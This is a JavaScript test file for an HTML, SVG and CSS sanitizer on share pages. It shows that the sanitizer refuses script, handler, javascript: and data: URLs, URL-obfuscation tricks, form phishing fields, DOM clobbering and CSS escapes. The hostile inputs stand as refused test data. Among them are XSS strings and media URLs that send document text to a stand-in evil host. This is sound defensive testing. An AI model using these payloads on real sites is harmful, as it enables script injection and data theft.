// sanitize.js: the share pages' rules (features/sites/src/sanitize.rs),
// its tests' cases as element and attribute rules, the form the edit
// stream needs them in.
import { test } from 'node:test';
import assert from 'node:assert/strict';
import { attrRule, cleanStyle, cssInert, elementRule, loadOk, styleProperty, urlOk } from '../sanitize.js';

test('elements: a drawing and basic HTML kept, what runs or hides markup dropped, the rest unwrapped', () => {
  for (const t of ['svg', 'g', 'path', 'rect', 'text', 'linearGradient', 'use', 'a']) assert.equal(elementRule(t, true)[0], 'keep', t);
  assert.deepEqual(elementRule('lineargradient', true), ['keep', 'linearGradient'], 'its case as written out');
  for (const t of ['div', 'span', 'button', 'table', 'img', 'audio', 'details', 'svg']) assert.equal(elementRule(t, false)[0], 'keep', t);
  for (const t of ['script', 'SCRIPT', 'iframe', 'object', 'embed', 'base', 'meta', 'link', 'template', 'noscript', 'form', 'portal', 'frame'])
    assert.deepEqual(elementRule(t, false), ['drop'], t);
  for (const t of ['foreignObject', 'animate', 'set', 'animateTransform', 'script', 'style', 'filter', 'handler'])
    assert.deepEqual(elementRule(t, true), ['drop'], `svg ${t}`);
  assert.deepEqual(elementRule('custom-element', false), ['unwrap']);
  assert.deepEqual(elementRule('marquee', false), ['unwrap']);
  // A live view keeps its fields; a static rule set does not.
  for (const t of ['input', 'textarea', 'select', 'option', 'label']) {
    assert.equal(elementRule(t, false, true)[0], 'keep', t);
    assert.notEqual(elementRule(t, false, false)[0], 'keep', `static ${t}`);
  }
  assert.deepEqual(elementRule('input', true), ['drop'], 'no field inside a drawing');
});

test('attributes: never a handler, a frame or a form action; ids and data-* not the page’s own', () => {
  for (const name of ['onclick', 'ONLOAD', 'onmouseover', 'srcdoc', 'srcset', 'ping', 'action', 'formaction', 'form'])
    assert.equal(attrRule('div', name, 'x', false), null, name);
  assert.equal(attrRule('div', 'class', 'a b', false), 'a b');
  assert.equal(attrRule('div', 'id', 'mine', false), 'mine', 'no prefix outside a pane');
  for (const id of ['site-header', 'share-x', 'comments', 'architect', 'addEventListener']) assert.equal(attrRule('div', 'id', id, false), null, id);
  assert.equal(attrRule('div', 'data-at', '1.5', false), '1.5');
  for (const n of ['data-site-x', 'data-act', 'data-dioxus-id', 'data-']) assert.equal(attrRule('div', n, '1', false), null, n);
  assert.equal(attrRule('div', 'aria-label', 'Add', false), 'Add');
  assert.equal(attrRule('div', 'x"y', '1', false), null, 'not a name');
  assert.equal(attrRule('button', 'type', 'button', false), 'button');
  assert.equal(attrRule('button', 'type', 'submit', false), null, 'nothing submits');
  assert.equal(attrRule('input', 'type', 'checkbox', false), 'checkbox');
  assert.equal(attrRule('input', 'type', 'image', false), null, 'an image input loads a src');
  assert.equal(attrRule('input', 'value', 'typed', false), 'typed');
  assert.equal(attrRule('td', 'colspan', '2', false), '2');
  assert.equal(attrRule('div', 'colspan', '2', false), null, 'only where it belongs');
  assert.equal(attrRule('svg', 'xmlns', 'http://www.w3.org/2000/svg', true), 'http://www.w3.org/2000/svg');
  assert.equal(attrRule('svg', 'xmlns', 'http://evil', true), null);
  assert.equal(attrRule('div', 'title', 'a\u0000b', false), 'ab', 'controls taken out');
});

test('URLs: links only to https, mailto or its own fragment; nothing relative', () => {
  for (const u of ['https://example.com', 'mailto:a@b.c']) assert.ok(urlOk(u, 'link'), u);
  for (const u of [
    'javascript:alert(1)',
    'JaVaScRiPt:alert(1)',
    ' java\tscript:alert(1)',
    'java\u0000script:alert(1)',
    'vbscript:x',
    'data:text/html,<script>alert(1)</script>',
    'http://example.com',
    '//evil.com/x',
    '\\\\evil.com/x',
    '/csrf-get?action=delete',
    'page.html',
  ])
    assert.ok(!urlOk(u, 'link'), u);
  assert.equal(attrRule('a', 'href', 'javascript:alert(1)', false), null);
  assert.equal(attrRule('a', 'href', '#bar-2', false, true, { prefix: 'av1-', urls: [] }), '#av1-bar-2');
  assert.equal(attrRule('div', 'href', '/x', false), null, 'no href but a link’s');
});

// P2 (review of #539): a view could make requests its capabilities do not
// allow. Its payloads: media from any https host, and relative URLs that
// are cookie-bearing GETs to the embedder's own origin.
test('P2: a view loads nothing from the network unless the embedder allows that URL', () => {
  const none = { prefix: 'av1-', urls: [] };
  const cdn = { prefix: 'av1-', urls: ['https://cdn.example/media/'] };
  assert.equal(attrRule('video', 'src', 'https://evil.example/?d=secret-document-text', false, true, none), null);
  assert.equal(attrRule('audio', 'src', 'https://evil.example/a.mp3', false, true, none), null);
  assert.equal(attrRule('source', 'src', 'https://evil.example/a.mp4', false, true, none), null);
  assert.equal(attrRule('img', 'src', '/csrf-get?action=delete', false, true, none), null);
  assert.equal(attrRule('img', 'src', 'csrf-get?action=delete', false, true, none), null);
  assert.equal(attrRule('image', 'href', '/csrf-get?action=delete', true, true, none), null);
  assert.equal(attrRule('video', 'src', '/csrf-get?action=delete', false, true, none), null);
  assert.equal(attrRule('img', 'src', 'https://tracker.example/pixel.gif', false, true, none), null);
  // Inline rasters need no network.
  assert.equal(attrRule('img', 'src', 'data:image/png;base64,AA', false, true, none), 'data:image/png;base64,AA');
  assert.equal(attrRule('img', 'src', 'data:image/svg+xml,<svg onload=alert(1)>', false, true, none), null);
  // What the embedder allows, and only that.
  assert.equal(attrRule('video', 'src', 'https://cdn.example/media/a.mp4', false, true, cdn), 'https://cdn.example/media/a.mp4');
  assert.equal(attrRule('video', 'src', 'https://cdn.example/other/a.mp4', false, true, cdn), null);
  assert.equal(attrRule('video', 'src', 'https://cdn.example.evil/media/a.mp4', false, true, cdn), null);
  assert.equal(attrRule('img', 'src', '/media/a.png', false, true, cdn), null, 'relative never, even with an allow-list');
  assert.ok(!loadOk('http://cdn.example/media/a', 'media', ['http://cdn.example/media/']), 'an http: prefix is no allow-list entry');
});

// P3: form injection and password phishing.
test('P3: a view’s fields carry nothing a form or the browser’s autofill reads', () => {
  for (const t of ['hidden', 'password', 'file', 'email', 'image', 'submit', 'HIDDEN'])
    assert.equal(attrRule('input', 'type', t, false), null, t);
  for (const t of ['text', 'checkbox', 'range']) assert.equal(attrRule('input', 'type', t, false), t);
  for (const [tag, name] of [
    ['input', 'name'], ['input', 'form'], ['input', 'autocomplete'], ['textarea', 'name'], ['textarea', 'form'],
    ['select', 'name'], ['select', 'autocomplete'], ['button', 'form'], ['button', 'formaction'], ['button', 'name'],
  ])
    assert.equal(attrRule(tag, name, 'role', false), null, `${tag} ${name}`);
  assert.equal(attrRule('input', 'value', 'admin', false), 'admin', 'what it shows');
});

// P4: id hijacking and DOM clobbering.
test('P4: a view’s ids and every reference to one are its pane’s own', () => {
  const v = { prefix: 'av7-', urls: [] };
  assert.equal(attrRule('input', 'id', 'pw', false, true, v), 'av7-pw');
  assert.equal(attrRule('div', 'id', 'config', false, true, v), 'av7-config');
  assert.equal(attrRule('label', 'for', 'pw', false, true, v), 'av7-pw');
  assert.equal(attrRule('div', 'aria-labelledby', 'a b', false, true, v), 'av7-a av7-b');
  assert.equal(attrRule('div', 'aria-describedby', 'a "b"', false, true, v), null);
  assert.equal(attrRule('use', 'href', '#logo', true, true, v), '#av7-logo');
  assert.equal(attrRule('use', 'href', 'https://evil/x.svg#g', true, true, v), null);
  assert.equal(attrRule('rect', 'fill', 'url(#grad)', true, true, v), 'url(#av7-grad)');
  assert.equal(attrRule('rect', 'clip-path', 'url(#c)', true, true, v), 'url(#av7-c)');
  assert.equal(attrRule('div', 'id', 'x y', false, true, v), null, 'one token');
});

test('CSS: blunt; nothing that loads, binds, escapes or positions itself over the page', () => {
  assert.equal(cleanStyle('color: red; font-size: 12px'), 'color: red; font-size: 12px');
  assert.equal(cleanStyle('color:red; position:fixed; background:url(x.png)'), 'color:red');
  assert.equal(cleanStyle('position: relative'), 'position: relative');
  for (const s of ['position:absolute', 'position: fixed', 'position:sticky', 'background:url(x)', 'width:expression(alert(1))', '-moz-binding:x', 'color:var(--x)', '--x:1'])
    assert.equal(cleanStyle(s), null, s);
  for (const s of ['color:"red"', "content:'x'", 'color:r\\65 d', 'a{color:red}', 'color:red/* */']) assert.equal(cleanStyle(s), null, `dropped whole: ${s}`);
  assert.ok(cssInert('fill:red') && !cssInert('fill:url(#g)') && !cssInert('@import x'));
  // The edit stream's `style` namespace: one property at a time.
  assert.equal(styleProperty('width', '50%'), '50%');
  assert.equal(styleProperty('position', 'fixed'), null);
  assert.equal(styleProperty('position', 'relative'), 'relative');
  assert.equal(styleProperty('background', 'url(https://x/y.png)'), null);
  assert.equal(styleProperty('color', 'red; position: fixed'), null);
  assert.equal(styleProperty('--accent', 'red'), null);
  // A presentation attribute may point at its own drawing only.
  assert.equal(attrRule('rect', 'fill', 'url(#g)', true), 'url(#g)');
  assert.equal(attrRule('rect', 'fill', 'url(https://evil/x)', true), null);
  assert.equal(attrRule('rect', 'fill', 'url(#g) url(x)', true), null);
});

// N1 (second review of #539): `https:cdn.example.com/…` is RELATIVE to an
// https page in a browser: a cookie-bearing request to the embedder's own
// site. Every form that is not an absolute URL as written is refused, and
// what is set is the parsed URL.
test('N1: only an absolute URL as written, of an allowed origin, under its path', () => {
  const v = { prefix: 'av1-', urls: ['https://cdn.example.com/', 'https://media.example.org/clips'] };
  const refused = [
    'https:cdn.example.com/../../api/x',
    'https:cdn.example.com/steal.png?csrf=1',
    'https:/cdn.example.com/x',
    'https:\\\\cdn.example.com/x',
    'https:\\cdn.example.com/x',
    '//cdn.example.com/x',
    '/cdn.example.com/x',
    'cdn.example.com/x',
    'https://cdn.example.com@evil.net/x',
    'https://user:pw@cdn.example.com/x',
    'https://cdn.example.com.evil.net/x',
    'https://CDN.example.com/x',
    'HTTPS://cdn.example.com/x',
    'https://cdn.example.com./x',
    'https://cdn.exämple.com/x',
    'https://xn--cdn-exmple-r2a.com/x',
    'https://cdn.example.com/%2e%2e/api/x',
    'https://cdn.example.com/a/../../api/x',
    'https://cdn.example.com/a/./x',
    'ht\ttps://cdn.example.com/x',
    'https\n://cdn.example.com/x',
    'https://cdn.exa\nmple.com/x',
    ' https://cdn.example.com/x',
    'https://cdn.example.com/x ',
    'http://cdn.example.com/x',
    'https://cdn.example.com:443/x',
    'https://media.example.org/clips-evil/x',
    'https://media.example.org/clip',
    'blob:https://cdn.example.com/1234',
  ];
  for (const u of refused) {
    for (const [tag, name, svg] of [['img', 'src', false], ['video', 'src', false], ['source', 'src', false], ['image', 'href', true]])
      assert.equal(attrRule(tag, name, u, svg, true, v), null, `${tag} ${JSON.stringify(u)}`);
  }
  for (const u of ['https://cdn.example.com/x.png', 'https://cdn.example.com/a/b/c.mp4?v=1', 'https://media.example.org/clips/a.mp4', 'https://media.example.org/clips'])
    assert.equal(attrRule('video', 'src', u, false, true, v), u, u);
  assert.equal(attrRule('img', 'src', 'blob:https://page.example/u-1', false, true, { prefix: '', urls: ['blob:https://page.example/u-1'] }), 'blob:https://page.example/u-1');
  // Links: the same parse; a relative-looking `https:` is no link.
  for (const u of ['https:evil.example/x', 'https:/evil/x', '//evil/x', 'https://a@evil/', 'https://EVIL/']) assert.equal(attrRule('a', 'href', u, false), null, u);
  assert.equal(attrRule('a', 'href', 'https://example.com/a', false), 'https://example.com/a');
  assert.equal(attrRule('a', 'href', 'mailto:a@b.c', false), 'mailto:a@b.c');
});

// ── A view's stylesheet (an island's, studio#445) ─────────────────────
import { cleanSheet } from '../sanitize.js';

const PREFIX = '/_ext/island/demo.ab12/';

test('a view’s stylesheet keeps rules, nesting, groups and Tailwind’s theme, written out again from its tokens', () => {
  assert.equal(cleanSheet('.a{color:red}.b:hover{transform:scale(2)}'), '.a{color:red;}.b:hover{transform:scale(2);}');
  assert.equal(cleanSheet('.a{color:red;&:hover{color:blue;@media (hover:hover){color:green}}}'), '.a{color:red;&:hover{color:blue;@media (hover:hover){color:green;}}}');
  // Tailwind's theme on :root and :host: its custom properties, on the view's box.
  assert.equal(cleanSheet('@layer theme,base;@layer theme{:root,:host{--c:#fff}}.b{color:var(--c)}'), '.architect-view{--c:#fff;}.b{color:var(--c);}');
  assert.equal(cleanSheet('@property --a{syntax:"<length>";inherits:false;initial-value:0}'), '@property --a{syntax:"<length>";inherits:false;initial-value:0;}');
  assert.equal(cleanSheet('.text-\\[10px\\]{font-size:10px}.w-1\\/2{width:50%}'), '.text-\\[10px\\]{font-size:10px;}.w-1\\/2{width:50%;}');
  assert.equal(cleanSheet('@keyframes spin{to{transform:rotate(360deg)}}'), '@keyframes spin{to{transform:rotate(360deg);}}');
  assert.equal(cleanSheet('.a{position:absolute;inset:0}'), '.a{position:absolute;inset:0;}');
  assert.equal(cleanSheet(`.a{background:url('${PREFIX}i.png')}`, PREFIX), `.a{background:url("${PREFIX}i.png");}`);
  // A comment is not a gap a name can be split across: `:ho/**/st` is two tokens.
  assert.notEqual(cleanSheet('.a:ho/**/st{color:red}'), null);
});

test('a view’s stylesheet is refused whole on anything that reaches its host, the page, the network or markup', () => {
  const bad = [
    // The review's payloads (architect#601).
    String.raw`:\68 ost{position:fixed!important;inset:0!important;z-index:2147483647!important}`,
    String.raw`.wasi-count::before{content:\75 rl(https://e.vil/x) "{";}}`,
    // :host, every spelling.
    ':host{width:100vw}', ':HOST{width:1px}', String.raw`:\68ost{width:1px}`, String.raw`:\000068 ost{width:1px}`,
    String.raw`:\48 OST{width:1px}`, String.raw`:h\6f st{width:1px}`, String.raw`:\68 \6f \73 \74 {width:1px}`,
    ':host(.x){margin:-9999px}', ':host-context(body){color:red}', ':is(:host){color:red}', ':where(:host) .a{color:red}',
    '::part(x){color:red}', '::slotted(*){color:red}', ':root{color:red}', ':scope{color:red}',
    'html{color:red}', 'body .a{color:red}', 'HTML{color:red}', String.raw`\68 tml{color:red}`,
    '.architect-view{width:1px}', '.architect-view-host{width:1px}', String.raw`.architect\-view{width:1px}`,
    // :root/:host with more than custom properties.
    ':root,:host{--c:#fff;width:1px}',
    // url(), every spelling, outside the island's own path.
    '.a{background:url(https://e.vil/b)}', '.a{background:url("https://e.vil/b")}', String.raw`.a{background:u\rl(https://e.vil/b)}`,
    String.raw`.a{background:\75 rl(https://e.vil/b)}`, String.raw`.a{background:\55 RL(https://e.vil/b)}`, String.raw`.a{background:ur\l(x)}`,
    '.a{background:URL(https://e.vil/b)}', `.a{background:url(${PREFIX}../../x)}`, '.a{background:url(/s/abc/x.png)}',
    // What loads, reads or draws another element.
    '.a{content:attr(data-media)}', '.a::before{content:attr(data-title url)}', '.a{background:image-set("x" 1x)}',
    '.a{background:-webkit-image-set(url(x) 1x)}', '.a{background:image(x)}', '.a{background:element(#x)}',
    '.a{background:paint(x)}', '.a{background:src("x")}', '.a{width:expression(alert(1))}', '.a{-moz-binding:url(x)}', '.a{behavior:url(x)}',
    // At-rules.
    '@import url(https://e.vil/x.css);', '@import "x.css";', '@charset "utf-8";', '@namespace svg url(http://www.w3.org/2000/svg);',
    '@font-face{font-family:x;src:url(https://e.vil/f);unicode-range:U+0-7F}', '@page{margin:0}', '@media x{@import url(y);}',
    '@document url-prefix(){.a{color:red}}', '@unknown{.a{b:c}}', '.a{&:hover{@font-feature-values x{}}}',
    // The box contract.
    '.a{position:fixed}', '.a{position:sticky}', String.raw`.a{position:\66ixed}`, '.a{position:FIXED}',
    '.a{width:100vw!important}', '.a{z-index:9!important}', '.a{transform:none ! important}',
    // What the tokeniser does not take.
    '.a{content:"unclosed}', ".a{content:'x\ny'}", '.a{color:red', '.a{color:red}}', '.a{color:(red}', '.a{color:red}/* unclosed',
    '</style><script>alert(1)</script>', '.a<b{color:red}', '<!-- .a{color:red} -->', '.a{color:red\\', String.raw`.a{color:r\
ed}`,
    '.a{color:red;}{}', '{color:red}', '.a{color:red}@', '.a{color:red}\u0000',
  ];
  for (const css of bad) assert.equal(cleanSheet(css, PREFIX), null, css);
});

test('what cleanSheet writes, cleaned again, is itself', () => {
  for (const css of [
    '.a{color:red;&:hover{color:blue;@media (hover:hover){color:green}}}',
    '@layer theme{:root,:host{--c:#fff}}.b{color:var(--c)}',
    String.raw`.text-\[10px\]{font-size:10px}`,
    `.a::before{content:"\\"}\\a x"}`,
  ]) {
    const once = cleanSheet(css, PREFIX);
    assert.notEqual(once, null, css);
    assert.equal(cleanSheet(once, PREFIX), once, css);
  }
});
